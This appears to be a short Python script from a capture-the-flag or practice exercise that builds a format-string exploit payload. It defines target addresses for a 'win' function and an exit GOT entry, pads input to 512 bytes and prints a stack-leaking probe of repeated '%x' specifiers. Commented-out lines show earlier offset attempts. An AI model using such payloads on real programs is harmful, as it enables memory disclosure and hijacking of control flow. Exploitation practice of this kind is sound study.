import struct

WIN = 0x4011b9
EXIT = 0x404040

def pad(s):
    return s + "X" * (512-len(s))

#exploit = struct.pack("I", EXIT)
#exploit = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      CCCC    EEEE    GGGG    IIII    KKKK    LLLL    MMMM    NNNN"
#exploit = "AAAAAAAAAAAA    CCCC"
exploit = "AAAABBBBCCCCDDDDEEEE" 
exploit += "%x " * 20


print(pad(exploit))


